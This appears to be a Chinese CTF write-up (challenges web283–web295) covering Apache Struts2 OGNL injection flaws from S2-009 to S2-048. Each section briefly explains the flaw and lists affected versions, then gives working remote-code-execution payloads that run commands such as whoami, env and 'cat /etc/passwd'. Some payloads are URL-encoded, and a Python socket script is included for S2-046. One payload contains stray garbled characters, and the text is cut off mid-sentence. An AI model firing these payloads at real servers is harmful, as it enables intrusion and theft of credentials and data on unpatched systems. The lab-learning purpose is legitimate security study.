title="S2-009"></a>S2-009</h3><p>这个漏洞再次来源于s2-003、s2-005<br>参考Struts2漏洞分析之Ognl表达式特性引发的新思路，文中说到，该引入ognl的方法不光可能出现在这个漏洞中，也可能出现在其他java应用中<br>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于#号，同样使用编码\u0023或\43进行绕过；于是Struts2对s2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线<br>但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用/helloword.acton?example=<OGNL statement>&amp;(example)(‘xxx’)=1的方法来执行它，从而绕过官方对#、\等特殊字符的防御<br>通过Struts2框架中ParametersInterceptor拦截器只检查传入的参数名而不检查参数值的方式进行构造OGNL表达式从而造成代码执行<br>影响版本：Struts 2.0.0 - Struts 2.3.1<br><code>http://your-ip:8080/ajax/example5.action</code>即可访问该控制器<br>payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690901618232-92eccea1-a51d-4e57-96c1-d97ab91b2662.png" alt="image.png"><br>可以直接下载得到一个文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690901903963-8d9c0690-3830-4867-9793-2a5190a1ed1a.png" alt="image.png"></p><h1 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h1><h3 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h3><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-012&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.UserAction&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;redirect&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>/index.jsp?name=$&#123;name&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行<br>影响版本: 2.1.0 - 2.3.13<br>payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>将payload放入输入框中提交，就可以下载到文本内容。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692536585259-0819a898-28ff-441e-b5e4-403757ed8f6d.png" alt="image.png"><br>flag在环境里面，直接查看即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692536905535-1f302ae2-41aa-44af-8576-00ccfff0fd02.png" alt="image.png"></p><h1 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h1><h3 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h3><p>Struts2 标签中 <code>&lt;s:a&gt;</code> 和 <code>&lt;s:url&gt;</code> 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</p><ul><li>none - 链接不包含请求的任意参数值（默认）</li><li>get - 链接只包含 GET 请求中的参数和其值</li><li>all - 链接包含 GET 和 POST 所有参数和其值</li></ul><p>&lt;s:a&gt;用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞<br>影响版本：2.0.0 - 2.3.14.1<br>poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,#a=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;id&#x27;</span>).getInputStream(),#b=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#a),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#b),#d=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#c.read(#d),#out=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>&#125;</span><br></pre></td></tr></table></figure><p>看看payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link.action?a=%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;env&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%dddddddd3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%dd7D</span><br></pre></td></tr></table></figure><p>（似乎第二个用不了，测试得不到rce）</p><h1 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h1><h3 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h3><p>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-015&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;*&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.PageAction&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span>&gt;</span>/&#123;1&#125;.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / “ \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功<br>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 #_memberAccess[‘allowStaticMethodAccess’]=true 来修改其值达到重获静态方法调用的能力<br>影响版本: 2.0.0 - 2.3.14.2<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692537740735-e067567e-b70b-414e-9435-4415d6015bfc.png" alt="image.png"><br>poc:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream()),#q&#125;.action</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%65%6e%76%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d%2e%61%63%74%69%6f%6e</span><br></pre></td></tr></table></figure><p>全部url编码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printenv | grep FLAG</span><br></pre></td></tr></table></figure><p>似乎flag没在env里面，或者可能是输出有限制。感觉是输出有限制，因为结尾没有输出完全，那换个方法。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692540843538-b2af1750-19f1-42c0-9349-590ec3e4fa1e.png" alt="image.png"><br>气死我了，怎么写都输出不来后半段总是识别不出来。妈的工具一把嗦。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692540864123-aea0c64b-79f9-4d6a-8fe3-e5be0d1ef63c.png" alt="image.png"><br>妈的 上面那个payload重新启动容器就ok了：<br>URL转义下方内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;printenv | grep FLAG&#x27;).getInputStream()),#q&#125;.action</span><br></pre></td></tr></table></figure><h1 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h1><h3 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h3><p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令<br>所以，访问<a href="http://your-ip:8080/index.action?redirect:OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8COGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F">http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式</a><br>影响版本: 2.0.0 - 2.3.15<br>poc：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;uname -a&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125;</span><br></pre></td></tr></table></figure><h1 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h1><h3 id="S2-019"><a href="#S2-019" class="headerlink" title="S2-019"></a>S2-019</h3><p>动态方法调用的默认启用，原理类似于s2-008<br>Apache Struts 2的“Dynamic Method Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码<br>与s2-008poc区别不同的仅仅是由原先的[“allowStaticMethodAccess”]=true静态方法执行改为(new java.lang.ProcessBuilder(‘id’)).start()，但该方法在虚空浪子心提出s2-012后不久就在博客里说明了官方修补方案将allowStaticMethodAccess取消了后的替补方法就是使用ava.lang.ProcessBuilder<br>影响版本：Struts 2.0.0 - Struts 2.3.15.1<br>poc：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=#a=(new java.lang.ProcessBuilder(&#x27;id&#x27;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()</span><br><span class="line">// 利用是先进行url编码    </span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?debug=command</span><br><span class="line">&amp;expression=%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%27%65%6e%76%27%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6f%75%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%0a</span><br></pre></td></tr></table></figure><p>这里用那个printenv就不行</p><h1 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h1><h3 id="S2-029"><a href="#S2-029" class="headerlink" title="S2-029"></a>S2-029</h3><p>Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估<br>例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%{}”。最终造成二次执行<br>影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）<br>poc：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default.action?message=(%23_memberAccess[&#x27;allowPrivateAccess&#x27;]=true,%23_memberAccess[&#x27;allowProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;excludedPackageNamePatterns&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;excludedClasses&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;allowPackageProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;allowStaticMethodAccess&#x27;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream()))</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default.action?message=(%23_memberAccess[&#x27;allowPrivateAccess&#x27;]=true,%23_memberAccess[&#x27;allowProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;excludedPackageNamePatterns&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;excludedClasses&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;allowPackageProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;allowStaticMethodAccess&#x27;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream()))</span><br></pre></td></tr></table></figure><h1 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h1><h3 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h3><p>漏洞原理<br>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:<name>的方式来调用名字是<name>的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞<br>影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)<br>poc：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=env</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h1><h3 id="S2-033"><a href="#S2-033" class="headerlink" title="S2-033"></a>S2-033</h3><p>漏洞原理<br>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行<br>影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</span><br></pre></td></tr></table></figure><h1 id="web292"><a href="#web292" class="headerlink" title="web292"></a>web292</h1><h3 id="S2-037"><a href="#S2-037" class="headerlink" title="S2-037"></a>S2-037</h3><p>漏洞原理<br>当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式<br>影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=whoami</span><br></pre></td></tr></table></figure><h1 id="web293"><a href="#web293" class="headerlink" title="web293"></a>web293</h1><h3 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h3><p>漏洞原理<br>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵<br>恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令<br>影响版本：Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: &quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;whoami&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot; boundary=----WebKitFormBoundaryXx80aU0pu6vrsV3z</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692543378438-72c29cb1-e05a-4f01-b514-425e311a76a2.png" alt="image.png"></p><h1 id="web294"><a href="#web294" class="headerlink" title="web294"></a>web294</h1><h3 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h3><p>漏洞原理<br>与s2-045类似，但是输入点在文件上传的filename值位置，并需要使用\x00截断<br>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10<br>这里wp用的是用socket发包：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">q = <span class="string">b&#x27;&#x27;&#x27;------WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,233*233)&#125;\x00b&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foo</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryXd004BVJN9pBYBL2--&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8080</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: en-US,en;q=0.8,es;q=0.6</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Length: %d</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>) % (<span class="built_in">len</span>(q), )</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((<span class="string">&#x27;your-ip&#x27;</span>, <span class="string">&#x27;8080&#x27;</span>), timeout=<span class="number">5</span>) <span class="keyword">as</span> conn:</span><br><span class="line">    conn.send(p + q)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">10240</span>).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个包没太发明白，过段时间在研究一下。<br>工具一把梭。</p><h1 id="web295"><a href="#web295" class="headerlink" title="web295"></a>web295</h1><h3 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h3><p>漏洞原理<br>漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用<br>而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 